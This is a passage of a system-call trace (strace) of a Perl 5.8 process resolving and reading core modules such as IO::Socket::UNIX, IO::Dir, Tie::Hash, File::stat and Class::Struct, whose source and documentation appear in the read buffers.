12710 07:43:45.452739 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12710 07:43:45.453618 _llseek(6, 1386, [1386], SEEK_SET) = 0
12710 07:43:45.453636 _llseek(6, 0, [1386], SEEK_CUR) = 0
12710 07:43:45.453647 close(6)          = 0
12710 07:43:45.453716 stat64("/etc/perl/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453733 stat64("/etc/perl/IO/Dir.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453748 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453765 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453780 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453793 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453807 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453819 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453832 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453845 stat64("/usr/share/perl5/IO/Dir.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453858 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.453871 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
12710 07:43:45.453893 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.453907 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.453919 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.453939 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
12710 07:43:45.454417 stat64("/etc/perl/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454434 stat64("/etc/perl/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454448 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454461 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454475 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454488 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454502 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454514 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454528 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454540 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454553 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454566 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.454580 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.454593 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
12710 07:43:45.454615 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.454629 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.454641 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.454660 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
12710 07:43:45.454982 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
12710 07:43:45.455542 read(8, "", 4096) = 0
12710 07:43:45.455558 close(8)          = 0
12710 07:43:45.455589 stat64("/etc/perl/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455604 stat64("/etc/perl/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455618 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455631 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455646 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455659 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455684 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455696 stat64("/usr/lib/perl5/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455709 stat64("/usr/share/perl5/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455726 stat64("/usr/share/perl5/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455740 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455753 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.455767 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.455780 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
12710 07:43:45.455802 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.455817 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.455828 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.455846 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
12710 07:43:45.456306 stat64("/etc/perl/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456325 stat64("/etc/perl/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456339 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456352 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456367 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456380 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456395 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456407 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456421 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456433 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456447 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456460 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf8ee3fc) = -1 ENOENT (No such file or directory)
12710 07:43:45.456475 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf8ee4ec) = -1 ENOENT (No such file or directory)
12710 07:43:45.456488 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
12710 07:43:45.456510 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
12710 07:43:45.456525 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee208) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.456536 _llseek(10, 0, [0], SEEK_CUR) = 0
12710 07:43:45.456555 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq 